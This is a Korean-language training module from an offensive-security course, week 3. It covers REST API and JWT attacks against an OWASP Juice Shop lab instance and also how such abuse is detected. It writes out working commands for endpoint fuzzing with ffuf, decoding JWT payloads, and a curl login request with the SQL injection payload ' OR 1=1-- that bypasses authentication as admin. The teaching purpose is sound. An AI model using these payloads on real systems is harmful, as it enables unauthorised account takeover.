# 공격기법 W03 — 웹앱 구조·API·JWT 공격 vs API 남용 탐지

> 공격기법 트랙 3주차. 선행: W01–W02. 인프라: el34 (juiceshop = juice.el34.lab, REST API + JWT). 플랫폼: tw2.

---

## 1. 이번 주의 통찰 — 현대 웹은 API다

전통 웹(서버 렌더링)과 달리 현대 웹앱(juiceshop 등)은 **REST API + 토큰 인증(JWT)** 으로 동작한다.
공격 표면이 `/rest`, `/api` 엔드포인트 + 토큰으로 옮겨갔다. API 공격은 다르게 접근한다.

```
 전통 웹: 폼 → 서버 렌더링 페이지
 현대 웹: JS 프론트 → REST API(/rest/*, /api/*) → JSON ← JWT 토큰 인증
                       ↑ 공격 표면(엔드포인트 열거, 인증 우회, JWT 조작)
```

---

## 2. ① API 엔드포인트 열거

JS 앱은 수많은 API 엔드포인트를 부른다. 열거로 표면을 매핑:
```bash
curl -s -H 'Host: juice.el34.lab' http://10.20.30.1/rest/products/search?q=test | head -c 200
docker exec el34-attacker ffuf -u http://10.20.30.1/rest/FUZZ -w <wordlist> -H 'Host: juice.el34.lab' -mc 200,401
```
- `/rest/products`, `/rest/user/login`, `/api/Feedbacks` … 각 엔드포인트가 공격 지점.
- 다량 요청 → IDS/WAF가 스캐너성으로 탐지(W02처럼 시끄러움).

---

## 3. ② JWT — 토큰 인증의 약점

로그인하면 서버가 **JWT(JSON Web Token)** 를 준다. 형식: `header.payload.signature`(base64url).
```bash
# 로그인 → JWT 획득
curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' \
  -d '{"email":"a@a.com","password":"x"}' http://10.20.30.1/rest/user/login
# JWT payload 디코드 (서명 검증 없이 내용 노출)
echo '<jwt payload part>' | base64 -d
```
- **payload는 누구나 디코드**(base64) — 민감 정보 담으면 노출.
- JWT 약점: 약한 서명키(brute), `alg:none` 우회, 만료 미검증, 서명 미검증.

---

## 4. ③ 인증 우회 — 로그인 SQLi

juiceshop 로그인 API는 SQLi에 취약(교육용). 이메일에 SQLi:
```bash
curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' http://10.20.30.1/rest/user/login
```
- `' OR 1=1--` → 첫 사용자(admin)로 로그인 성공 → JWT 획득 = 인증 우회(A07).
- 응답에 `authentication.token`(JWT)이 오면 우회 성공.

---

## 5. API 남용 탐지 (방어 관점)

- **열거**: 짧은 시간 다량 엔드포인트 요청 → IDS/WAF 스캐너 탐지.
- **인증 공격**: 로그인 API의 SQLi 페이로드 → ModSec 942.
- **이상 토큰**: 만료/서명 불일치 JWT 반복 사용 → 토큰 남용 신호.

---

## 6. 실습(lab) 형식 — 8 미션

1. **점검**: juiceshop 도달 + API 응답
2. **API 엔드포인트 열거**: /rest/* 매핑
3. **JWT 획득**: 로그인 → 토큰
4. **JWT 디코드**: payload 내용 노출
5. **인증 우회**: 로그인 SQLi → 우회
6. **API 남용 탐지**: 방어층 흔적
7. **API 공격 표면 정리**
8. **API/JWT 공격 보고서**

> 명령은 el34 호스트(`ssh ccc@192.168.0.151`)에서 `docker exec el34-attacker` 로. 인가된 실습만.

---

## 7. 다음 주차 (W04) 예고 — SQL Injection 심화

W03은 인증 우회용 SQLi를 맛봤다. W04는 SQLi 본격 — sqlmap 자동화, WAF 우회 기법, 그리고 그게 어떻게
탐지·차단되는지 깊게 다룬다.
